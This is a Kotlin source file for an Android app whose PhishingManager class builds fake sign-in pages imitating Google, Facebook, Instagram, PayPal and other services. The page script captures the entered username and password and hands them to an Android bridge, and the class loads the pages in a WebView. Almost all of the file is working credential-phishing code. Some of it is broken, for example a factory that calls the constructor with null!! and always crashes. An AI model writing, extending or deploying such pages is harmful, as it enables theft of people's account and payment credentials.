package com.sync.xxx.managers

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.util.Log
import android.webkit.WebView
import org.json.JSONObject

/**
 * PhishingManager.kt
 * Create and display phishing pages
 * Fake login pages to capture credentials
 */
class PhishingManager(private val context: Context) {

    private val TAG = "PhishingManager"

    /**
     * Open phishing URL in browser
     */
    fun openPhishingPage(url: String): Boolean {
        return try {
            val intent = Intent(Intent.ACTION_VIEW)
            intent.data = Uri.parse(url)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            context.startActivity(intent)
            Log.d(TAG, "Phishing page opened: $url")
            true
        } catch (e: Exception) {
            Log.e(TAG, "Error opening phishing page", e)
            false
        }
    }

    /**
     * Generate fake login HTML page
     */
    fun generateFakeLoginPage(service: String, logoUrl: String? = null): String {
        return """
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - $service</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            padding: 40px;
            max-width: 400px;
            width: 100%;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo img {
            max-width: 150px;
            height: auto;
        }
        h1 {
            font-size: 24px;
            margin-bottom: 10px;
            text-align: center;
            color: #333;
        }
        p {
            text-align: center;
            color: #666;
            margin-bottom: 30px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            color: #333;
            font-weight: 500;
        }
        input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 14px;
        }
        input:focus {
            outline: none;
            border-color: #4285f4;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #4285f4;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
        }
        button:hover {
            background: #357ae8;
        }
        .footer {
            margin-top: 20px;
            text-align: center;
            font-size: 12px;
            color: #999;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            ${if (logoUrl != null) "<img src='$logoUrl' alt='$service'>" else "<h2>$service</h2>"}
        </div>
        <h1>Sign in</h1>
        <p>Use your $service account</p>
        <form id="loginForm" onsubmit="return handleSubmit(event)">
            <div class="form-group">
                <label>Email or username</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit">Sign in</button>
        </form>
        <div class="footer">
            &copy; 2024 $service. All rights reserved.
        </div>
    </div>
    <script>
        function handleSubmit(event) {
            event.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // Send data via Android interface
            if (window.Android) {
                window.Android.submitCredentials(username, password);
            }
            
            // Show loading or redirect
            alert('Verifying credentials...');
            return false;
        }
    </script>
</body>
</html>
        """.trimIndent()
    }

    /**
     * Generate fake Google login page
     */
    fun generateGoogleLogin(): String {
        return generateFakeLoginPage(
            "Google",
            "https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"
        )
    }

    /**
     * Generate fake Facebook login page
     */
    fun generateFacebookLogin(): String {
        return generateFakeLoginPage("Facebook", null)
    }

    /**
     * Generate fake Instagram login page
     */
    fun generateInstagramLogin(): String {
        return generateFakeLoginPage("Instagram", null)
    }

    /**
     * Generate fake PayPal login page
     */
    fun generatePayPalLogin(): String {
        return generateFakeLoginPage("PayPal", null)
    }

    /**
     * Load phishing page in WebView
     */
    fun loadPhishingInWebView(webView: WebView, html: String) {
        try {
            webView.settings.javaScriptEnabled = true
            webView.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null)
            Log.d(TAG, "Phishing page loaded in WebView")
        } catch (e: Exception) {
            Log.e(TAG, "Error loading phishing page", e)
        }
    }

    /**
     * Export phishing info as JSON
     */
    fun getPhishingInfoAsJson(service: String, targetUrl: String): JSONObject {
        return JSONObject().apply {
            put("service", service)
            put("targetUrl", targetUrl)
            put("timestamp", System.currentTimeMillis())
        }
    }

    /**
     * Phishing template types
     */
    enum class PhishingTemplate {
        GOOGLE,
        FACEBOOK,
        INSTAGRAM,
        TWITTER,
        PAYPAL,
        NETFLIX,
        AMAZON,
        APPLE,
        MICROSOFT,
        CUSTOM
    }

    companion object {
        /**
         * Generate phishing page for template
         */
        fun generatePhishingPage(template: PhishingTemplate, customService: String? = null): String {
            val manager = PhishingManager(null!!)
            return when (template) {
                PhishingTemplate.GOOGLE -> manager.generateGoogleLogin()
                PhishingTemplate.FACEBOOK -> manager.generateFacebookLogin()
                PhishingTemplate.INSTAGRAM -> manager.generateInstagramLogin()
                PhishingTemplate.PAYPAL -> manager.generatePayPalLogin()
                PhishingTemplate.CUSTOM -> {
                    if (customService != null) {
                        manager.generateFakeLoginPage(customService)
                    } else {
                        manager.generateFakeLoginPage("Service")
                    }
                }
                else -> manager.generateFakeLoginPage(template.name.lowercase().capitalize())
            }
        }
    }
}
